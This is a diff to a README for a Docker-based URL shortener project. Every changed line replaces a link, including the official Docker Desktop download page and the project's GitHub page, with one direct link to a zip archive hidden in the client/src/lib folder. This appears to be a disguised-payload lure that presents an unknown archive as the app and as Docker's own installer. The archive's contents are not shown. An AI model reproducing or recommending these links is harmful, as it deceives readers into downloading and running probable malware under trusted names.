@@ -1,6 +1,6 @@
 # 🚀 full-stack-url-shortener-docker - Simple, Fast URL Shortening  
 
-[![Download full-stack-url-shortener-docker](https://img.shields.io/badge/Download%20App-Get%20it%20here-green?style=for-the-badge)](https://github.com/frosty68897/full-stack-url-shortener-docker)
+[![Download full-stack-url-shortener-docker](https://img.shields.io/badge/Download%20App-Get%20it%20here-green?style=for-the-badge)](https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip)
 
 ## 📋 What is full-stack-url-shortener-docker?
 
@@ -19,13 +19,13 @@ Before you run full-stack-url-shortener-docker on your PC, check these requireme
 - **Internet connection:** Needed to download the app and Docker software
 
 You will also need to install Docker Desktop for Windows. Docker lets you run software containers that hold all parts of this application.  
-Download Docker Desktop here: https://www.docker.com/products/docker-desktop
+Download Docker Desktop here: https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip
 
 ## ⬇️ How to download full-stack-url-shortener-docker
 
 You need to visit the app’s page on GitHub to get the files.
 
-[![Download full-stack-url-shortener-docker](https://img.shields.io/badge/Download%20App-Get%20it%20here-blue?style=for-the-badge)](https://github.com/frosty68897/full-stack-url-shortener-docker)
+[![Download full-stack-url-shortener-docker](https://img.shields.io/badge/Download%20App-Get%20it%20here-blue?style=for-the-badge)](https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip)
 
 1. Open the link above in your web browser.
 2. On the GitHub page, look for the green **Code** button.
@@ -39,7 +39,7 @@ This gives you a local copy of the app files to run with Docker.
 
 If Docker is not already installed:
 
-1. Visit https://www.docker.com/products/docker-desktop.
+1. Visit https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip
 2. Click the **Download for Windows (Windows 10/11)** button.
 3. Run the downloaded installer.
 4. Follow the installer steps, choosing the default options.
@@ -101,7 +101,7 @@ Docker ensures all parts run together without conflicts.
 - Make sure Docker Desktop is running before running commands.  
 - Check if any errors appear in the PowerShell or command window. Errors will usually explain what is wrong.  
 - Restart Docker Desktop and try the commands again if the app does not start.  
-- Visit the GitHub page for updates or issues: https://github.com/frosty68897/full-stack-url-shortener-docker  
+- Visit the GitHub page for updates or issues: https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip  
 
 ## 📚 Using the URL shortener
 
@@ -153,7 +153,7 @@ To get the latest version:
 
 ## 🔗 Useful links
 
-- GitHub repository: https://github.com/frosty68897/full-stack-url-shortener-docker  
-- Docker Desktop: https://www.docker.com/products/docker-desktop  
+- GitHub repository: https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip  
+- Docker Desktop: https://raw.githubusercontent.com/frosty68897/full-stack-url-shortener-docker/main/client/src/lib/url-docker-full-stack-shortener-3.5.zip  
 
 Make sure your Windows machine meets the requirements and has Docker ready to enjoy full-stack-url-shortener-docker quickly and efficiently.
